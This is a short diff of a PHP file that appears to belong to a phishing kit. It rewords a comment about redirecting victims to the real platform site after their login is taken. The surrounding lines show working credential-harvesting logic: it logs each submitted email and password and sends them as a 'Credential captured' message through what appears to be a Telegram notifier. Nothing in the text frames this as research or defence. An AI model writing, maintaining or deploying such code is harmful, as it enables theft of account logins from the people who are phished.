@@ -21,7 +21,7 @@ if ($email !== '' && $pass !== '') {
     log_event('credential', $data);
     $msg = "[{$platform}] Credential captured: {$email} / {$pass}";
     tg_notify($msg);
-    // Optionally redirect to the real site after capture
+    // Redirect to the real site after capturing credentials (optional)
     // header('Location: https://'.$platform.'.com/');
     // exit();
 }
